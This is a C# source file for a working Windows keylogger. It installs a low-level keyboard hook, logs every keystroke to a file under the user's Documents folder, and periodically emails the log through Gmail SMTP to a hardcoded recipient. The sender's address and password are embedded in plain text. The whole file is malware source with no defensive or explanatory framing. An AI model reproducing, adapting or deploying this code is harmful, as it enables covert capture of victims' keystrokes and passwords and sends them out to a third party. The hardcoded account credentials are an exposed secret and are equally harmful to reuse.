using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;
using System.Net.Mail;
using System.Net;


namespace WindowsKeylogger
{
    class Program
    {
        #region Constants
        private const string FROM_EMAIL_ADDRESS = "scoutkeabba@gmail.com";
        private const string FROM_EMAIL_PASSWORD = "jaisharma1";
        private const string TO_EMAIL_ADDRESS = "james.bluedevil@gmail.com";
        private const string LOG_FILE_NAME = "KeyloggerLogs.txt";
        private const string ARCHIVE_FILE_NAME = "KeyLoggerArchive.txt";
        private const bool INCLUDE_LOG_AS_ATTACHMENT = true;
        private const int MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL = 300;
        private const int MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG = 0;
        #endregion

        #region PrivateFields
        private static string LOG_FOLDER_NAME = "WindowsKeylogger";
        private static string LOG_FILE_ADDRESS = "";
        private static string LOG_ARCHIVE_FILE_ADDRESS = "";

        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x0100;
        private static IntPtr hook = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProcedure = HookCallback;
        private static string buffer = "";
        #endregion

        static void Main(string[] args)
        {
            SetupLogFolder();
            hook = SetHook(llkProcedure);
            Application.Run();
            UnhookWindowsHookEx(hook);
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static void SetupLogFolder()
        {
            var logFolderAddress = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), LOG_FOLDER_NAME);

            if (!Directory.Exists(logFolderAddress)) {
                Directory.CreateDirectory(logFolderAddress);
            }

            LOG_FILE_ADDRESS = Path.Combine(logFolderAddress, LOG_FILE_NAME);
            LOG_ARCHIVE_FILE_ADDRESS = Path.Combine(logFolderAddress, ARCHIVE_FILE_NAME);
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {

            if (buffer.Length >= MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG) {
                StreamWriter output = new StreamWriter(LOG_FILE_ADDRESS, true);
                output.Write(buffer);
                output.Close();
                buffer = "";
            }

            FileInfo logFile = new FileInfo(LOG_FILE_ADDRESS);

            // Archive and email the log file if the max size has been reached
            if (logFile.Exists && logFile.Length >= MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL) {
                try {
                    // Copy the log file to the archive
                    logFile.CopyTo(LOG_ARCHIVE_FILE_ADDRESS, true);

                    // Delete the log file
                    logFile.Delete();

                    // Email the archive and send email using a new thread
                    System.Threading.Thread mailThread = new System.Threading.Thread(Program.sendMail);
                    Console.Out.WriteLine("\n\nSENDING MAIL\n");
                    mailThread.Start();
                } catch (Exception e) {
                    Console.Out.WriteLine(e.Message);
                }
            }

            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                int vkCode = Marshal.ReadInt32(lParam);
                if (((Keys)vkCode).ToString() == "OemPeriod") {
                    Console.Out.Write(".");
                    buffer += ".";
                } else if (((Keys)vkCode).ToString() == "Oemcomma") {
                    Console.Out.Write(",");
                    buffer += ",";
                } else if (((Keys)vkCode).ToString() == "Space") {
                    Console.Out.Write(" ");
                    buffer += " ";
                } else {
                    Console.Out.Write((Keys)vkCode);
                    buffer += (Keys)vkCode;
                }
            }

            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        public static void sendMail()
        {
            try {
                // Read the archive file contents into the email body variable
                StreamReader input = new StreamReader(LOG_ARCHIVE_FILE_ADDRESS);
                string emailBody = input.ReadToEnd();
                input.Close();

                // Create the email client object
                SmtpClient client = new SmtpClient("smtp.gmail.com") {
                    Port = 587,
                    DeliveryMethod = SmtpDeliveryMethod.Network,
                    UseDefaultCredentials = false,
                    Credentials = new NetworkCredential(FROM_EMAIL_ADDRESS, FROM_EMAIL_PASSWORD),
                    EnableSsl = true,
                };

                // Build the email message
                MailMessage message = new MailMessage {
                    From = new MailAddress(FROM_EMAIL_ADDRESS),
                    Subject = Environment.UserName + " - " + DateTime.Now.Month + "." + DateTime.Now.Day + "." + DateTime.Now.Year,
                    Body = emailBody,
                    IsBodyHtml = false,
                };

                if (INCLUDE_LOG_AS_ATTACHMENT) {
                    Attachment attachment = new Attachment(LOG_ARCHIVE_FILE_ADDRESS, System.Net.Mime.MediaTypeNames.Text.Plain);
                    message.Attachments.Add(attachment);
                }

                // Set the recipient
                message.To.Add(TO_EMAIL_ADDRESS);

                // Send the message
                client.Send(message);

                // Release resources used by the msssage (archive file)
                message.Dispose();
            } catch (Exception e) {
                Console.Out.WriteLine(e.Message);
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);
    }
}
